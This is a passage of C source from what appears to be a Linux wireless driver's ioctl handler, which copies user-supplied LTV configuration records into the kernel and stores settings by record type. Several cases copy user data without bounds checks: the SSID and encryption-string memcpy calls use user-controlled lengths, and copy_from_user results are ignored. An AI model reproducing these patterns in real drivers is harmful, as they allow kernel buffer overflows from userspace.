\"UIL_ERR_LEN\\n\");\n\t\t\t\t\tDBG_LEAVE(DbgInfo);\n\t\t\t\t\treturn result;\n\t\t\t\t}\n\n\t\t\t\t/* Verify the user buffer */\n\t\t\t\tresult = verify_area(VERIFY_READ, urq->data, urq->len);\n\t\t\t\tif (result != 0) {\n\t\t\t\t\turq->result = UIL_FAILURE;\n\t\t\t\t\tDBG_ERROR(DbgInfo, \"verify_area(), VERIFY_READ FAILED\\n\");\n\t\t\t\t\tDBG_LEAVE(DbgInfo);\n\t\t\t\t\treturn result;\n\t\t\t\t}\n\n\t\t\t\t/* Get only the command and length information. */\n\t\t\t\tcopy_from_user(&(lp->ltvRecord), urq->data, sizeof(hcf_16) * 2);\n\n\t\t\t\t/* Make sure the incoming LTV record length is within the bounds of the\n\t\t\t\t   IOCTL length */\n\t\t\t\tif (((lp->ltvRecord.len + 1) * sizeof(hcf_16)) > urq->len) {\n\t\t\t\t\turq->len = sizeof(lp->ltvRecord);\n\t\t\t\t\turq->result = UIL_ERR_LEN;\n\t\t\t\t\tDBG_ERROR(DbgInfo, \"UIL_ERR_LEN\\n\");\n\t\t\t\t\tDBG_LEAVE(DbgInfo);\n\t\t\t\t\treturn result;\n\t\t\t\t}\n\n\t\t\t\t/* If the requested length is greater than the size of our local\n\t\t\t\t   LTV record, try to allocate it from the kernel stack.\n\t\t\t\t   Otherwise, we just use our local LTV record. */\n\t\t\t\tif (urq->len > sizeof(lp->ltvRecord)) {\n\t\t\t\t\tpLtv = kmalloc(urq->len, GFP_KERNEL);\n\t\t\t\t\tif (pLtv != NULL) {\n\t\t\t\t\t\tltvAllocated = TRUE;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tDBG_ERROR(DbgInfo, \"Alloc FAILED\\n\");\n\t\t\t\t\t\turq->len = sizeof(lp->ltvRecord);\n\t\t\t\t\t\turq->result = UIL_ERR_LEN;\n\t\t\t\t\t\tresult = -ENOMEM;\n\t\t\t\t\t\tDBG_LEAVE(DbgInfo);\n\t\t\t\t\t\treturn result;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tpLtv = &(lp->ltvRecord);\n\t\t\t\t}\n\n\t\t\t\t/* Copy the data from the user's buffer into the local LTV\n\t\t\t\t   record data area. */\n\t\t\t\tcopy_from_user(pLtv, urq->data, urq->len);\n\n\n\t\t\t\t/* We need to snoop the commands to see if there is anything we\n\t\t\t\t   need to store for the purposes of a reset or start/stop\n\t\t\t\t   sequence. Perform endian translation as needed */\n\t\t\t\tswitch (pLtv->typ) {\n\t\t\t\tcase CFG_CNF_PORT_TYPE:\n\t\t\t\t\tlp->PortType    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_OWN_MAC_ADDR:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_OWN_CHANNEL:\n\t\t\t\t\tlp->Channel     = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\t/* CFG_CNF_OWN_SSID currently same as CNF_DESIRED_SSID. Do we\n\t\t\t\t   need separate storage for this? */\n\t\t\t\t/* case CFG_CNF_OWN_SSID: */\n\t\t\t\tcase CFG_CNF_OWN_ATIM_WINDOW:\n\t\t\t\t\tlp->atimWindow  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_SYSTEM_SCALE:\n\t\t\t\t\tlp->DistanceBetweenAPs  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\n\t\t\t\tcase CFG_CNF_MAX_DATA_LEN:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based\n\t\t\t\t\t   on this */\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_PM_ENABLED:\n\t\t\t\t\tlp->PMEnabled   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_MCAST_RX:\n\t\t\t\t\tlp->MulticastReceive    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_MAX_SLEEP_DURATION:\n\t\t\t\t\tlp->MaxSleepDuration    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_HOLDOVER_DURATION:\n\t\t\t\t\tlp->holdoverDuration    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n \t\t\t\t\tbreak;\n \t\t\t\tcase CFG_CNF_OWN_NAME:\n \t\t\t\t\tmemset(lp->StationName, 0, sizeof(lp->StationName));\n\t\t\t\t\tlen = min_t(size_t, pLtv->u.u16[0], sizeof(lp->StationName));\n\t\t\t\t\tstrlcpy(lp->StationName, &pLtv->u.u8[2], len);\n \t\t\t\t\tpLtv->u.u16[0] = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n \t\t\t\t\tbreak;\n \t\t\t\tcase CFG_CNF_LOAD_BALANCING:\n\t\t\t\t\tlp->loadBalancing       = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_MEDIUM_DISTRIBUTION:\n\t\t\t\t\tlp->mediumDistribution  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#ifdef WARP\n\t\t\t\tcase CFG_CNF_TX_POW_LVL:\n\t\t\t\t\tlp->txPowLevel          = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\t/* case CFG_CNF_SHORT_RETRY_LIMIT: */ /* Short Retry Limit */\n\t\t\t\t/* case 0xFC33: */   /* Long Retry Limit */\n\t\t\t\tcase CFG_SUPPORTED_RATE_SET_CNTL:        /* Supported Rate Set Control */\n\t\t\t\t\tlp->srsc[0]             = pLtv->u.u16[0];\n\t\t\t\t\tlp->srsc[1]             = pLtv->u.u16[1];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tpLtv->u.u16[1]          = CNV_INT_TO_LITTLE(pLtv->u.u16[1]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_BASIC_RATE_SET_CNTL:        /* Basic Rate Set Control */\n\t\t\t\t\tlp->brsc[0]             = pLtv->u.u16[0];\n\t\t\t\t\tlp->brsc[1]             = pLtv->u.u16[1];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tpLtv->u.u16[1]          = CNV_INT_TO_LITTLE(pLtv->u.u16[1]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_CONNECTION_CNTL:\n\t\t\t\t\tlp->connectionControl   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\t/* case CFG_PROBE_DATA_RATE: */\n#endif  /* HERMES25 */\n\n#if 1 /* ;? (HCF_TYPE) & HCF_TYPE_AP */\n\t\t/* ;?should we restore this to allow smaller memory footprint */\n\n\t\t\t\tcase CFG_CNF_OWN_DTIM_PERIOD:\n\t\t\t\t\tlp->DTIMPeriod  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#ifdef WARP\n\t\t\t\tcase CFG_CNF_OWN_BEACON_INTERVAL:        /* Own Beacon Interval */\n\t\t\t\t\tlp->ownBeaconInterval   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#endif /* WARP */\n\t\t\t\tcase CFG_COEXISTENSE_BEHAVIOUR:         /* Coexistence behavior */\n\t\t\t\t\tlp->coexistence         = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#ifdef USE_WDS\n\t\t\t\tcase CFG_CNF_WDS_ADDR1:\n\t\t\t\t\tmemcpy(&lp->wds_port[0].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_1;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_WDS_ADDR2:\n\t\t\t\t\tmemcpy(&lp->wds_port[1].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_2;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_WDS_ADDR3:\n\t\t\t\t\tmemcpy(&lp->wds_port[2].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_3;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_WDS_ADDR4:\n\t\t\t\t\tmemcpy(&lp->wds_port[3].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_4;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_WDS_ADDR5:\n\t\t\t\t\tmemcpy(&lp->wds_port[4].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_5;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_WDS_ADDR6:\n\t\t\t\t\tmemcpy(&lp->wds_port[5].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_6;\n\t\t\t\t\tbreak;\n#endif  /* USE_WDS */\n\n\t\t\t\tcase CFG_CNF_MCAST_PM_BUF:\n\t\t\t\t\tlp->multicastPMBuffering    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_REJECT_ANY:\n\t\t\t\t\tlp->RejectAny   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#endif\n\n\t\t\t\tcase CFG_CNF_ENCRYPTION:\n\t\t\t\t\tlp->EnableEncryption    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_AUTHENTICATION:\n\t\t\t\t\tlp->authentication  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#if 1 /* ;? (HCF_TYPE) & HCF_TYPE_AP */\n\t\t/* ;?should we restore this to allow smaller memory footprint */\n\n\t\t\t\t/* case CFG_CNF_EXCL_UNENCRYPTED:\n\t\t\t\t\tlp->ExcludeUnencrypted  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak; */\n\t\t\t\tcase CFG_CNF_MCAST_RATE:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_INTRA_BSS_RELAY:\n\t\t\t\t\tlp->intraBSSRelay   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#endif\n\n\t\t\t\tcase CFG_CNF_MICRO_WAVE:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\t/*case CFG_CNF_LOAD_BALANCING:*/\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\t/* break; */\n\t\t\t\t/* case CFG_CNF_MEDIUM_DISTRIBUTION: */\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\t/* break; */\n\t\t\t\t/* case CFG_CNF_RX_ALL_GROUP_ADDRESS: */\n\t\t\t\t\t/*  TODO: determine if we are going to store anything based on this */\n\t\t\t\t\t/* break; */\n\t\t\t\t/* case CFG_CNF_COUNTRY_INFO: */\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\t/* break; */\n\t\t\t\tcase CFG_CNF_OWN_SSID:\n\t\t\t\t/* case CNF_DESIRED_SSID: */\n\t\t\t\tcase CFG_DESIRED_SSID:\n\t\t\t\t\tmemset(lp->NetworkName, 0, sizeof(lp->NetworkName));\n\t\t\t\t\tmemcpy((void *)lp->NetworkName, (void *)&pLtv->u.u8[2], (size_t)pLtv->u.u16[0]);\n\t\t\t\t\tpLtv->u.u16[0] = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\n\t\t\t\t\t/* take care of the special network name \"ANY\" case */\n\t\t\t\t\tif ((strlen(&pLtv->u.u8[2]) == 0) ||\n\t\t\t\t\t   (strcmp(&pLtv->u.u8[2], \"ANY\") == 0) ||\n\t\t\t\t\t   (strcmp(&pLtv->u.u8[2], \"any\") == 0)) {\n\t\t\t\t\t\t/* set the SSID_STRCT llen field (u16[0]) to zero, and the\n\t\t\t\t\t\teffectually null the string u8[2] */\n\t\t\t\t\t\tpLtv->u.u16[0] = 0;\n\t\t\t\t\t\tpLtv->u.u8[2]  = 0;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_GROUP_ADDR:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CREATE_IBSS:\n\t\t\t\t\tlp->CreateIBSS  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH:\n\t\t\t\t\tlp->RTSThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL:\n\t\t\t\t\tlp->TxRateControl[0]    = pLtv->u.u16[0];\n\t\t\t\t\tlp->TxRateControl[1]    = pLtv->u.u16[1];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tpLtv->u.u16[1]          = CNV_INT_TO_LITTLE(pLtv->u.u16[1]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_PROMISCUOUS_MODE:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\t/* case CFG_WAKE_ON_LAN: */\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\t/* break; */\n#if 1 /* ;? #if (HCF_TYPE) & HCF_TYPE_AP */\n\t\t/* ;?should we restore this to allow smaller memory footprint */\n\t\t\t\tcase CFG_RTS_THRH0:\n\t\t\t\t\tlp->RTSThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL0:\n/*;?no idea what this should be, get going so comment it out\t\t\t\t\tlp->TxRateControl   = pLtv->u.u16[0];*/\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#ifdef USE_WDS\n\t\t\t\tcase CFG_RTS_THRH1:\n\t\t\t\t\tlp->wds_port[0].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_1;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH2:\n\t\t\t\t\tlp->wds_port[1].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_2;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH3:\n\t\t\t\t\tlp->wds_port[2].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_3;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH4:\n\t\t\t\t\tlp->wds_port[3].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_4;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH5:\n\t\t\t\t\tlp->wds_port[4].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_5;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH6:\n\t\t\t\t\tlp->wds_port[5].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_6;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL1:\n\t\t\t\t\tlp->wds_port[0].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_1;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL2:\n\t\t\t\t\tlp->wds_port[1].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_2;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL3:\n\t\t\t\t\tlp->wds_port[2].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_3;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL4:\n\t\t\t\t\tlp->wds_port[3].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_4;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL5:\n\t\t\t\t\tlp->wds_port[4].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_5;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL6:\n\t\t\t\t\tlp->wds_port[5].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_6;\n\t\t\t\t\tbreak;\n#endif  /* USE_WDS */\n#endif  /* (HCF_TYPE) & HCF_TYPE_AP */\n\n\t\t\t\tcase CFG_DEFAULT_KEYS:\n\t\t\t\t\t{\n\t\t\t\t\t\tCFG_DEFAULT_KEYS_STRCT *pKeys = (CFG_DEFAULT_KEYS_STRCT *)pLtv;\n\n\t\t\t\t\t\tpKeys->key[0].len = CNV_INT_TO_LITTLE(pKeys->key[0].len);\n\t\t\t\t\t\tpKeys->key[1].len = CNV_INT_TO_LITTLE(pKeys->key[1].len);\n\t\t\t\t\t\tpKeys->key[2].len = CNV_INT_TO_LITTLE(pKeys->key[2].len);\n\t\t\t\t\t\tpKeys->key[3].len = CNV_INT_TO_LITTLE(pKeys->key[3].len);\n\n\t\t\t\t\t\tmemcpy((void *)&(lp->DefaultKeys), (void *)pKeys,\n\t\t\t\t\t\t\t\tsizeof(CFG_DEFAULT_KEYS_STRCT));\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_KEY_ID:\n\t\t\t\t\tlp->TransmitKeyID   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_SCAN_SSID:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TICK_TIME:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\t/* these RIDS are Info RIDs, and should they be allowed for puts??? */\n\t\t\t\tcase CFG_MAX_LOAD_TIME:\n\t\t\t\tcase CFG_DL_BUF:\n\t\t\t\t/* case CFG_HSI_SUP_RANGE: */\n\t\t\t\tcase CFG_NIC_SERIAL_NUMBER:\n\t\t\t\tcase CFG_NIC_IDENTITY:\n\t\t\t\tcase CFG_NIC_MFI_SUP_RANGE:\n\t\t\t\tcase CFG_NIC_CFI_SUP_RANGE:\n\t\t\t\tcase CFG_NIC_TEMP_TYPE:\n\t\t\t\tcase CFG_NIC_PROFILE:\n\t\t\t\tcase CFG_FW_IDENTITY:\n\t\t\t\tcase CFG_FW_SUP_RANGE:\n\t\t\t\tcase CFG_MFI_ACT_RANGES_STA:\n\t\t\t\tcase CFG_CFI_ACT_RANGES_STA:\n\t\t\t\tcase CFG_PORT_STAT:\n\t\t\t\tcase CFG_CUR_SSID:\n\t\t\t\tcase CFG_CUR_BSSID:\n\t\t\t\tcase CFG_COMMS_QUALITY:\n\t\t\t\tcase CFG_CUR_TX_RATE:\n\t\t\t\tcase CFG_CUR_BEACON_INTERVAL:\n\t\t\t\tcase CFG_CUR_SCALE_THRH:\n\t\t\t\tcase CFG_PROTOCOL_RSP_TIME:\n\t\t\t\tcase CFG_CUR_SHORT_RETRY_LIMIT:\n\t\t\t\tcase CFG_CUR_LONG_RETRY_LIMIT:\n\t\t\t\tcase CFG_MAX_TX_LIFETIME:\n\t\t\t\tcase CFG_MAX_RX_LIFETIME:\n\t\t\t\tcase CFG_CF_POLLABLE:\n\t\t\t\tcase CFG_AUTHENTICATION_ALGORITHMS:\n\t\t\t\tcase CFG_PRIVACY_OPT_IMPLEMENTED:\n\t\t\t\t/* case CFG_CURRENT_REMOTE_RATES: */\n\t\t\t\t/* case CFG_CURRENT_USED_RATES: */\n\t\t\t\t/* case CFG_CURRENT_SYSTEM_SCALE: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE1: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE2: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE3: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE4: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE5: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE6: */\n\t\t\t\tcase CFG_NIC_MAC_ADDR:\n\t\t\t\tcase CFG_PCF_INFO:\n\t\t\t\t/* case CFG_CURRENT_COUNTRY_INFO: */\n\t\t\t\tcase CFG_PHY_TYPE:\n\t\t\t\tcase CFG_CUR_CHANNEL:\n\t\t\t\t/* case CFG_CURRENT_POWER_STATE: */\n\t\t\t\t/* case CFG_CCAMODE: */\n\t\t\t\tcase CFG_SUPPORTED_DATA_RATES:\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_AP_MODE:\n/*;?\t\t\t\tlp->DownloadFirmware = (pLtv->u.u16[0]) + 1; */\n\t\t\t\t\tDBG_ERROR(DbgInfo, \"set CFG_AP_MODE no longer supported\\n\");\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_ENCRYPT_STRING:\n\t\t\t\t\t/* TODO: ENDIAN TRANSLATION HERE??? */\n\t\t\t\t\tmemset(lp->szEncryption, 0, sizeof(lp->szEncryption));\n\t\t\t\t\tmemcpy((void *)lp->szEncryption,  (void *)&pLtv->u.u8[0],\n\t\t\t\t\t\t\t(pLtv->len * sizeof(hcf_16)));\n\t\t\t\t\twl_wep_decode(CRYPT_CODE, &sEncryption,\n\t\t\t\t\t\t\t\t    lp->szEncryption);\n\n\t\t\t\t\t/* the Linux driver likes to use 1-4 for the key IDs, and then\n\t\t\t\t\tconvert to 0-3 when sending to the card.  The Windows code\n\t\t\t\t\tbase used 0-3 in the API DLL, which was ported to Linux.  For\n\t\t\t\t\tthe sake of the user experience, we decided to keep 0-3 as the\n\t\t\t\t\tnumbers used in the DLL; and will perform the +1 conversion here.\n\t\t\t\t\tWe could have converted  the entire Linux driver, but this is\n\t\t\t\t\tless obtrusive.  This may be a \"todo\" to convert the whole driver */\n\t\t\t\t\tlp->TransmitKeyID    = sEncryption.wTxKeyID + 1;\n\t\t\t\t\tlp->EnableEncryption = sEncryption.wEnabled;\n\n\t\t\t\t\tmemcpy(&lp->DefaultKeys, &sEncryption.EncStr,\n\t\t\t\t\t\t\tsizeof(CFG_DEFAULT_KEYS_STRCT));\n\t\t\t\t\tbreak;\n\t\t\t\t/*case CFG_COUNTRY_STRING:\n\t\t\t\t\tmemset(lp->countryString, 0, sizeof(lp->countryString));\n\t\t\t\t\tmemcpy((void *)lp->countryString, (void *)&pLtv->u.u8[2], (size_t)pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\t*/\n\n\t\t\t\tcase CFG_DRIVER_ENABLE:\n\t\t\t\t\tlp->driverEnable    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_WOLAS_ENABLE:\n\t\t\t\t\tlp->wolasEnable = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_SET_WPA_AUTH_KEY_MGMT_SUITE:\n\t\t\t\t\tlp->AuthKeyMgmtSuite = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_DISASSOCIATE_ADDR:\n\t\t\t\t\tpLtv->u.u16[ETH_ALEN / 2] = CNV_INT_TO_LITTLE(pLtv->u.u16[ETH_ALEN / 2]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_ADD_TKIP_DEFAULT_KEY:\n\t\t\t\tcase CFG_REMOVE_TKIP_DEFAULT_KEY:\n\t\t\t\t\t/* Endian convert the Tx Key Information */\n\t\t\t\t\tpLtv->u.u16[0] = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_ADD_TKIP_MAPPED_KEY:\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_REMOVE_TKIP_MAPPED_KEY:\n\t\t\t\t\tbreak;\n\t\t\t\t/* some RIDs just can't be put */\n\t\t\t\tcase CFG_MB_INFO:\n\t\t\t\tcase CFG_IFB:\n\t\t\t\tdefault:\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\t/* This code will prevent Static Configuration Entities from\n\t\t\t\t   being sent to the card, as they require a call to\n\t\t\t\t   UIL_ACT_APPLY to take effect. Dynamic Entities will be sent\n\t\t\t\t   immediately */\n\t\t\t\tswitch (pLtv->typ) {\n\t\t\t\tcase CFG_CNF_PORT_TYPE:\n\t\t\t\tcase CFG_CNF_OWN_MAC_ADDR:\n\t\t\t\tcase CFG_CNF_OWN_CHANNEL:\n\t\t\t\tcase CFG_CNF_OWN_SSID:\n\t\t\t\tcase CFG_CNF_OWN_ATIM_WINDOW:\n\t\t\t\tcase CFG_CNF_SYSTEM_SCALE:\n\t\t\t\tcase CFG_CNF_MAX_DATA_LEN:\n\t\t\t\tcase CFG_CNF_PM_ENABLED:\n\t\t\t\tcase 